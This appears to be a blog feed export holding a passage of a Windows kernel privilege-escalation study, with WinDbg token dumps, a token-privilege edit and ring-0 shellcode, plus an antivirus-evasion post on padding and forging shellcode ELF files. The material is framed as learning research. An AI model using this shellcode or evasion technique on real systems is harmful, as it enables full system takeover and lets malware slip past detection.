class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; !process 0 0 system</span><br><span class="line">PROCESS ffffbf845d896040</span><br><span class="line">    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000</span><br><span class="line">    DirBase: 001ad002  ObjectTable: ffff8e0936605d40  HandleCount: 2284.</span><br><span class="line">    Image: System</span><br><span class="line"></span><br><span class="line">1: kd&gt; dq ffffbf845d896040+0x360 L1 </span><br><span class="line">ffffbf84&#96;5d8963a0  ffff8e09&#96;36607725</span><br><span class="line">1: kd&gt; dt _SEP_TOKEN_PRIVILEGES ffff8e09&#96;36607720+0x40  </span><br><span class="line">nt!_SEP_TOKEN_PRIVILEGES</span><br><span class="line">   +0x000 Present          : 0x0000001f&#96;f2ffffbc</span><br><span class="line">   +0x008 Enabled          : 0x0000001e&#96;60b1e890</span><br><span class="line">   +0x010 EnabledByDefault : 0x0000001e&#96;60b1e890</span><br><span class="line">  </span><br><span class="line">1: kd&gt; !token ffff8e09&#96;36607720 </span><br><span class="line">_TOKEN 0xffff8e0936607720</span><br><span class="line">TS Session ID: 0</span><br><span class="line">User: S-1-5-18</span><br><span class="line">User Groups: </span><br><span class="line"> 00 S-1-5-32-544</span><br><span class="line">    Attributes - Default Enabled Owner </span><br><span class="line"> 01 S-1-1-0</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 02 S-1-5-11</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 03 S-1-16-16384</span><br><span class="line">    Attributes - GroupIntegrity GroupIntegrityEnabled </span><br><span class="line">Primary Group: S-1-5-18</span><br><span class="line">Privs: </span><br><span class="line"> 02 0x000000002 SeCreateTokenPrivilege            Attributes - </span><br><span class="line"> 03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes - </span><br><span class="line"> 04 0x000000004 SeLockMemoryPrivilege             Attributes - Enabled Default </span><br><span class="line"> 05 0x000000005 SeIncreaseQuotaPrivilege          Attributes - </span><br><span class="line"> 07 0x000000007 SeTcbPrivilege                    Attributes - Enabled Default </span><br><span class="line"> 08 0x000000008 SeSecurityPrivilege               Attributes - </span><br><span class="line"> 09 0x000000009 SeTakeOwnershipPrivilege          Attributes - </span><br><span class="line"> 10 0x00000000a SeLoadDriverPrivilege             Attributes - </span><br><span class="line"> 11 0x00000000b SeSystemProfilePrivilege          Attributes - Enabled Default </span><br><span class="line"> 12 0x00000000c SeSystemtimePrivilege             Attributes - </span><br><span class="line"> 13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - Enabled Default </span><br><span class="line"> 14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled Default </span><br><span class="line"> 15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled Default </span><br><span class="line"> 16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled Default </span><br><span class="line"> 17 0x000000011 SeBackupPrivilege                 Attributes - </span><br><span class="line"> 18 0x000000012 SeRestorePrivilege                Attributes - </span><br><span class="line"> 19 0x000000013 SeShutdownPrivilege               Attributes - </span><br><span class="line"> 20 0x000000014 SeDebugPrivilege                  Attributes - Enabled Default </span><br><span class="line"> 21 0x000000015 SeAuditPrivilege                  Attributes - Enabled Default </span><br><span class="line"> 22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - </span><br><span class="line"> 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default </span><br><span class="line"> 25 0x000000019 SeUndockPrivilege                 Attributes - </span><br><span class="line"> 28 0x00000001c SeManageVolumePrivilege           Attributes - </span><br><span class="line"> 29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled Default </span><br><span class="line"> 30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled Default </span><br><span class="line"> 31 0x00000001f SeTrustedCredManAccessPrivilege   Attributes - </span><br><span class="line"> 32 0x000000020 SeRelabelPrivilege                Attributes - </span><br><span class="line"> 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled Default </span><br><span class="line"> 34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled Default </span><br><span class="line"> 35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled Default </span><br><span class="line"> 36 0x000000024 SeDelegateSessionUserImpersonatePrivilege  Attributes - Enabled Default </span><br><span class="line">Authentication ID:         (0,3e7)</span><br><span class="line">Impersonation Level:       Anonymous</span><br><span class="line">TokenType:                 Primary</span><br><span class="line">Source: *SYSTEM*           TokenFlags: 0x2000 ( Token NOT in use ) </span><br><span class="line">Token ID: 3eb              ParentToken ID: 0</span><br><span class="line">Modified ID:               (0, 3ec)</span><br><span class="line">RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000</span><br><span class="line">OriginatingLogonSession: 0</span><br><span class="line">PackageSid: (null)</span><br><span class="line">CapabilityCount: 0      Capabilities: 0x0000000000000000</span><br><span class="line">LowboxNumberEntry: 0x0000000000000000</span><br><span class="line">Security Attributes:</span><br><span class="line">Invalid AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION with no claims</span><br><span class="line">Process Token TrustLevelSid: S-1-19-1024-8192</span><br></pre></td></tr></table></figure><p>cmd.exe进程相关的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !process  0 0 cmd.exe </span><br><span class="line">PROCESS ffffab887e89d080</span><br><span class="line">    SessionId: 1  Cid: 1b40    Peb: 92bee25000  ParentCid: 0c70</span><br><span class="line">    DirBase: 469ed002  ObjectTable: ffff898d05d6ee00  HandleCount:  70.</span><br><span class="line">    Image: cmd.exe</span><br><span class="line"></span><br><span class="line">0: kd&gt; dq  ffffab887e89d080+0x360 L1 </span><br><span class="line">ffffab88&#96;7e89d3e0  ffff898d&#96;050a667c</span><br><span class="line">0: kd&gt; dt _SEP_TOKEN_PRIVILEGES   ffff898d&#96;050a6670+0x40 </span><br><span class="line">nt!_SEP_TOKEN_PRIVILEGES</span><br><span class="line">   +0x000 Present          : 0x00000006&#96;02880000</span><br><span class="line">   +0x008 Enabled          : 0x800000</span><br><span class="line">   +0x010 EnabledByDefault : 0x40800000</span><br><span class="line">0: kd&gt; !token ffff898d&#96;050a6670</span><br><span class="line">_TOKEN 0xffff898d050a6670</span><br><span class="line">TS Session ID: 0x1</span><br><span class="line">User: S-1-5-21-2935577425-332436725-3672547902-1000</span><br><span class="line">User Groups: </span><br><span class="line"> 00 S-1-5-21-2935577425-332436725-3672547902-513</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 01 S-1-1-0</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 02 S-1-5-114</span><br><span class="line">    Attributes - DenyOnly </span><br><span class="line"> 03 S-1-5-32-544</span><br><span class="line">    Attributes - DenyOnly </span><br><span class="line"> 04 S-1-5-32-545</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 05 S-1-5-4</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 06 S-1-2-1</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 07 S-1-5-11</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 08 S-1-5-15</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 09 S-1-5-113</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 10 S-1-5-5-0-123671</span><br><span class="line">    Attributes - Mandatory Default Enabled LogonId </span><br><span class="line"> 11 S-1-2-0</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 12 S-1-5-64-10</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 13 S-1-16-8192</span><br><span class="line">    Attributes - GroupIntegrity GroupIntegrityEnabled </span><br><span class="line">Primary Group: S-1-5-21-2935577425-332436725-3672547902-513</span><br><span class="line">Privs: </span><br><span class="line"> 19 0x000000013 SeShutdownPrivilege               Attributes - </span><br><span class="line"> 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default </span><br><span class="line"> 25 0x000000019 SeUndockPrivilege                 Attributes - </span><br><span class="line"> 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - </span><br><span class="line"> 34 0x000000022 SeTimeZonePrivilege               Attributes - </span><br><span class="line">Authentication ID:         (0,1e50f)</span><br><span class="line">Impersonation Level:       Anonymous</span><br><span class="line">TokenType:                 Primary</span><br><span class="line">Source: User32             TokenFlags: 0x2a00 ( Token in use )</span><br><span class="line">Token ID: eede5            ParentToken ID: 0</span><br><span class="line">Modified ID:               (0, 1e51b)</span><br><span class="line">RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000</span><br><span class="line">OriginatingLogonSession: 3e7</span><br><span class="line">PackageSid: (null)</span><br><span class="line">CapabilityCount: 0      Capabilities: 0x0000000000000000</span><br><span class="line">LowboxNumberEntry: 0x0000000000000000</span><br><span class="line">Security Attributes:</span><br><span class="line">Unable to get the offset of nt!_AUTHZBASEP_SECURITY_ATTRIBUTE.ListLink</span><br><span class="line">Process Token TrustLevelSid: (null)</span><br></pre></td></tr></table></figure><p>可以看到<code>cmde.exe</code> 拥有的特权明显比<code>system</code>少很多，接下来修改cmd.exe的<code>Present</code>,<code>Enabled</code>都和<code>system</code>相同，再看一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; eq ffff898d&#96;050a6670+0x40 0x0000001f&#96;f2ffffbc </span><br><span class="line">0: kd&gt; eq ffff898d&#96;050a6670+0x48 0x0000001f&#96;f2ffffbc </span><br><span class="line">0: kd&gt; !token ffff898d&#96;050a6670</span><br><span class="line">_TOKEN 0xffff898d050a6670</span><br><span class="line">TS Session ID: 0x1</span><br><span class="line">User: S-1-5-21-2935577425-332436725-3672547902-1000</span><br><span class="line">User Groups: </span><br><span class="line"> 00 S-1-5-21-2935577425-332436725-3672547902-513</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 01 S-1-1-0</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 02 S-1-5-114</span><br><span class="line">    Attributes - DenyOnly </span><br><span class="line"> 03 S-1-5-32-544</span><br><span class="line">    Attributes - DenyOnly </span><br><span class="line"> 04 S-1-5-32-545</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 05 S-1-5-4</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 06 S-1-2-1</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 07 S-1-5-11</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 08 S-1-5-15</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 09 S-1-5-113</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 10 S-1-5-5-0-123671</span><br><span class="line">    Attributes - Mandatory Default Enabled LogonId </span><br><span class="line"> 11 S-1-2-0</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 12 S-1-5-64-10</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 13 S-1-16-8192</span><br><span class="line">    Attributes - GroupIntegrity GroupIntegrityEnabled </span><br><span class="line">Primary Group: S-1-5-21-2935577425-332436725-3672547902-513</span><br><span class="line">Privs: </span><br><span class="line"> 02 0x000000002 SeCreateTokenPrivilege            Attributes - Enabled </span><br><span class="line"> 03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes - Enabled </span><br><span class="line"> 04 0x000000004 SeLockMemoryPrivilege             Attributes - Enabled </span><br><span class="line"> 05 0x000000005 SeIncreaseQuotaPrivilege          Attributes - Enabled </span><br><span class="line"> 07 0x000000007 SeTcbPrivilege                    Attributes - Enabled </span><br><span class="line"> 08 0x000000008 SeSecurityPrivilege               Attributes - Enabled </span><br><span class="line"> 09 0x000000009 SeTakeOwnershipPrivilege          Attributes - Enabled </span><br><span class="line"> 10 0x00000000a SeLoadDriverPrivilege             Attributes - Enabled </span><br><span class="line"> 11 0x00000000b SeSystemProfilePrivilege          Attributes - Enabled </span><br><span class="line"> 12 0x00000000c SeSystemtimePrivilege             Attributes - Enabled </span><br><span class="line"> 13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - Enabled </span><br><span class="line"> 14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled </span><br><span class="line"> 15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled </span><br><span class="line"> 16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled </span><br><span class="line"> 17 0x000000011 SeBackupPrivilege                 Attributes - Enabled </span><br><span class="line"> 18 0x000000012 SeRestorePrivilege                Attributes - Enabled </span><br><span class="line"> 19 0x000000013 SeShutdownPrivilege               Attributes - Enabled </span><br><span class="line"> 20 0x000000014 SeDebugPrivilege                  Attributes - Enabled </span><br><span class="line"> 21 0x000000015 SeAuditPrivilege                  Attributes - Enabled </span><br><span class="line"> 22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - Enabled </span><br><span class="line"> 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default </span><br><span class="line"> 25 0x000000019 SeUndockPrivilege                 Attributes - Enabled </span><br><span class="line"> 28 0x00000001c SeManageVolumePrivilege           Attributes - Enabled </span><br><span class="line"> 29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled </span><br><span class="line"> 30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled Default </span><br><span class="line"> 31 0x00000001f SeTrustedCredManAccessPrivilege   Attributes - Enabled </span><br><span class="line"> 32 0x000000020 SeRelabelPrivilege                Attributes - Enabled </span><br><span class="line"> 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled </span><br><span class="line"> 34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled </span><br><span class="line"> 35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled </span><br><span class="line"> 36 0x000000024 SeDelegateSessionUserImpersonatePrivilege  Attributes - Enabled </span><br><span class="line">Authentication ID:         (0,1e50f)</span><br><span class="line">Impersonation Level:       Anonymous</span><br><span class="line">TokenType:                 Primary</span><br><span class="line">Source: User32             TokenFlags: 0x2a00 ( Token in use )</span><br><span class="line">Token ID: eede5            ParentToken ID: 0</span><br><span class="line">Modified ID:               (0, 1e51b)</span><br><span class="line">RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000</span><br><span class="line">OriginatingLogonSession: 3e7</span><br><span class="line">PackageSid: (null)</span><br><span class="line">CapabilityCount: 0      Capabilities: 0x0000000000000000</span><br><span class="line">LowboxNumberEntry: 0x0000000000000000</span><br><span class="line">Security Attributes:</span><br><span class="line">Unable to get the offset of nt!_AUTHZBASEP_SECURITY_ATTRIBUTE.ListLink</span><br><span class="line">Process Token TrustLevelSid: (null)</span><br></pre></td></tr></table></figure><p>可以看到权限已经修改成功，但是来查看cmd.exe的用户名，发现并没有改变。</p><p><img src="https://pic.wonderkun.cc//uploads/note/20210822193044.png" alt=""></p><p>当前进程已经有了system权限，接下来依然可以通过注入，弹出一个system权限的shell。</p><h3 id="写shellcode-2"><a href="#写shellcode-2" class="headerlink" title="写shellcode"></a>写shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mov r9,qword ptr [gs:0x188]                   ;stores KPROCESS&#x2F;currentThread value</span><br><span class="line">mov r9,qword ptr [r9+0x220]                   ;stores EPROCESS as an offset to KTHREAD</span><br><span class="line">mov rcx, r9                                   ;if equal, saves EPROCESS into rcx</span><br><span class="line">add rcx, 0x360                                ;store cmd&#39;s token into rcx</span><br><span class="line">mov rax,qword ptr [rcx]                       ;store token into rax</span><br><span class="line">and rax, 0xFFFFFFFFFFFFFFF0                   ;remove the last nibble (fast reference)</span><br><span class="line">mov r8,  0x1ff2ffffbc                         ;stores the &#39;all-in&#39; privileges value into r8</span><br><span class="line">mov qword ptr [rax+0x40],r8                   ;Changes &#39;Privileges&#39; at offset 0x40 and god-mode it</span><br><span class="line">mov qword ptr [rax+0x48],r8                   ;Changes &#39;Privileges&#39; at offset 0x48 and god-mode it</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><h2 id="相关的代码"><a href="#相关的代码" class="headerlink" title="相关的代码"></a>相关的代码</h2><p>上面的测试代码放在github上，<a href="https://github.com/wonderkun/flare-kscldr" target="_blank" rel="noopener">https://github.com/wonderkun/flare-kscldr</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;近期由于某些项目的原因，突然激发了我对windows内核提权原理的兴趣。于是就想研究一下，在拿到一个内核态任意代码执行漏洞后，到底有多少种方法常用的方法还能在windows 10上成功提权，针对这些不同的提权方法到底有没有一个比较通用的拦截方案？ 所以就有了如下这篇学习记录。&lt;/p&gt;
&lt;p&gt;不同于ring3层的shellcode那样功能多样化，在的漏洞利用过程中，ring0层的shellcode通常用来获取 &lt;code&gt;nt authority&#92;system&lt;/code&gt;权限，本文基于的前提是已经有一个内核态任意代码执行漏洞的前提下，学习三种还能够在windows 10 上成功提权的方法，并写出相对应的shellcode。 &lt;/p&gt;
    
    </summary>
    
      <category term="windows驱动" scheme="http://blog.wonderkun.cc/categories/windows%E9%A9%B1%E5%8A%A8/"/>
    
    
      <category term="binary" scheme="http://blog.wonderkun.cc/tags/binary/"/>
    
      <category term="asm" scheme="http://blog.wonderkun.cc/tags/asm/"/>
    
      <category term="kernal" scheme="http://blog.wonderkun.cc/tags/kernal/"/>
    
  </entry>
  
  <entry>
    <title>杀软的无奈-汇编层的指令混淆(六)</title>
    <link href="http://blog.wonderkun.cc/2021/08/02/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E6%B1%87%E7%BC%96%E5%B1%82%E7%9A%84%E6%8C%87%E4%BB%A4%E6%B7%B7%E6%B7%86(%E5%85%AD)%20/"/>
    <id>http://blog.wonderkun.cc/2021/08/02/杀软的无奈-汇编层的指令混淆(六) /</id>
    <published>2021-08-02T11:57:14.000Z</published>
    <updated>2024-11-18T11:46:14.722Z</updated>
    
    <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX18wc/myjylJTIaVz805B/peyTalNh8z6Ls=</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="杀软的无奈" scheme="http://blog.wonderkun.cc/tags/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88/"/>
    
  </entry>
  
  <entry>
    <title>杀软的无奈-构建更具有欺骗性的ELF文件(五)</title>
    <link href="http://blog.wonderkun.cc/2021/07/26/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E6%9E%84%E5%BB%BA%E6%9B%B4%E5%85%B7%E6%9C%89%E6%AC%BA%E9%AA%97%E6%80%A7%E7%9A%84ELF%E6%96%87%E4%BB%B6(%E4%BA%94)/"/>
    <id>http://blog.wonderkun.cc/2021/07/26/杀软的无奈-构建更具有欺骗性的ELF文件(五)/</id>
    <published>2021-07-26T11:57:14.000Z</published>
    <updated>2024-11-18T11:46:14.722Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于安全客: <a href="https://www.anquanke.com/post/id/248688" target="_blank" rel="noopener">https://www.anquanke.com/post/id/248688</a></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在上一节我们已经通过自己编写的编码器对shellcode进行了编码，并且构建了一个ELF文件，但是出乎意料的是<code>McAfee</code> 和 <code>McAfee-GW-Edition</code> 还会报毒为木马，经过我的研究，我发现<code>McAfee</code>判黑的逻辑非常简单，只要文件大小小于某个阈值，并且<code>EntryPoint</code>附近有无法反汇编的数据，就会被报黑。这么看来，想让上一节的ELF文件不被所有的引擎检测就非常简单了，只需要在文件结尾再写一些乱数据就搞定了。</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">with</span> open(FILENAME,<span class="string">"wb"</span>) <span class="keyword">as</span> fd:</span><br><span class="line">    fd.write( elf_header_bytes + elf_pheader_bytes + shellcode )</span><br><span class="line">    fd.write( bytes( [ random.randint(<span class="number">0x00</span>,<span class="number">0xff</span>) <span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">1024</span>)] ) )</span><br></pre></td></tr></table></figure><p><img src="https://pic.wonderkun.cc//uploads/note/20210614164029.png" alt=""></p><p>经过一步简单的操作就无法被检测出来了，从<code>McAfee</code>上的检测逻辑上就可以管中窥豹，看到杀软在做检测时候的无奈，所以恶意代码检测还是非常困难的 …</p><p>直接填充垃圾数据来逃过检测肯定不是一个技术爱好者的最终追求，最好的方式还是去做一个真正看起来正常，并且执行起来也正常的ELF，这样才更具备更高的迷惑性。接下来的内容就开始一步步的实现这个目标。</p><h2 id="链接视图和装载视图"><a href="#链接视图和装载视图" class="headerlink" title="链接视图和装载视图"></a>链接视图和装载视图</h2><p>ELF文件是<code>Executable and Linkable Format</code>(可执行与可链接格式)的简称，即可以参与执行也可以参与链接。从链接的角度来看，elf文件是<code>Section</code>(节)的形式存储的，而在装载的角度上，Elf文件又可以按<code>Segment</code>（段）来划分。区别就是在链接视角下，Program Header Table 是可选的，但是Section Header Table是必选的，执行视角的就会反过来。节信息是ELF中信息的组织单元，段信息是节信息的汇总，指出一大段信息(包含若干个节)在加载执行过程中的属性。</p><p><img src="https://pic.wonderkun.cc//uploads/note/20210615001514.png" alt=""></p><p>由于在很多翻译文章中，段和节的概念总是混淆，导致傻傻分不清楚，所以在以后的文章中我们统一约定 <code>Segment</code> 为段，<code>Section</code>为节。</p><h2 id="丰富ELF文件的段信息"><a href="#丰富ELF文件的段信息" class="headerlink" title="丰富ELF文件的段信息"></a>丰富ELF文件的段信息</h2><p>ELF文件常见的段类型有如下几种:</p><table><thead><tr><th align="left">名字</th><th align="left">取值</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">PT_NULL</td><td align="left">0</td><td align="left">表明段未使用，其结构中其他成员都是未定义的。</td></tr><tr><td align="left">PT_LOAD</td><td align="left">1</td><td align="left">此类型段为一个可加载的段，大小由 p_filesz 和 p_memsz 描述。文件中的字节被映射到相应内存段开始处。如果 p_memsz 大于 p_filesz，“剩余” 的字节都要被置为 0。p_filesz 不能大于 p_memsz。可加载的段在程序头部中按照 p_vaddr 的升序排列。</td></tr><tr><td align="left">PT_DYNAMIC</td><td align="left">2</td><td align="left">此类型段给出动态链接信息，指向的是 .dynamic 节。</td></tr><tr><td align="left">PT_INTERP</td><td align="left">3</td><td align="left">此类型段给出了一个以 NULL 结尾的字符串的位置和长度，该字符串将被当作解释器调用。这种段类型仅对可执行文件有意义（也可能出现在共享目标文件中）。此外，这种段在一个文件中最多出现一次。而且这种类型的段存在的话，它必须在所有可加载段项的前面。</td></tr><tr><td align="left">PT_NOTE</td><td align="left">4</td><td align="left">此类型段给出附加信息的位置和大小。</td></tr><tr><td align="left">PT_SHLIB</td><td align="left">5</td><td align="left">该段类型被保留，不过语义未指定。而且，包含这种类型的段的程序不符合 ABI 标准。</td></tr><tr><td align="left">PT_PHDR</td><td align="left">6</td><td align="left">该段类型的数组元素如果存在的话，则给出了程序头部表自身的大小和位置，既包括在文件中也包括在内存中的信息。此类型的段在文件中最多出现一次。<strong>此外，只有程序头部表是程序的内存映像的一部分时，它才会出现</strong>。如果此类型段存在，则必须在所有可加载段项目的前面。</td></tr><tr><td align="left">PT_LOPROC~PT_HIPROC</td><td align="left">0x70000000 ~0x7fffffff</td><td align="left">此范围的类型保留给处理器专用语义。</td></tr></tbody></table><p>其中 <code>PT_LOAD</code> 和 <code>PT_DYNAMIC</code> 这两种类型的段在执行的时候会被加载到内存中去。<br>现在问题来了，我们现在需要为ELF文件伪造哪些段，并且分别存储什么样的数据才会显得像是一个正常的ELF文件呢？</p><h3 id="动态链接的ELF文件"><a href="#动态链接的ELF文件" class="headerlink" title="动态链接的ELF文件"></a>动态链接的ELF文件</h3><p><strong>最好的学习方法是模仿</strong>，我们打开一个gcc编译的正常的ELF文件，并采用动态的链接方式：</p><p><img src="https://pic.wonderkun.cc//uploads/note/20210615103553.png" alt=""></p><p>可以看到主要有如下几个的段：</p><ol><li><p>PT_PHDR: 不必再解释了。</p></li><li><p>PT_INERP: 指出了解释器的路径，一般的值为 <code>/lib/ld-linux.so.2</code>。 比较有意思的是如果把这个数据给修改了， 文件就无法正常执行了。例如下面的实验：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ strings ./a.out    | grep /lib/ld-linux  </span><br><span class="line">/lib/ld-linux.so.3</span><br><span class="line"><span class="comment"># 把 PT_INERP 的数据修改为 '/lib/ld-linux.so.3' </span></span><br><span class="line"></span><br><span class="line">$ ./a.out </span><br><span class="line">bash: ./a.out: No such file or directory</span><br><span class="line"><span class="comment"># 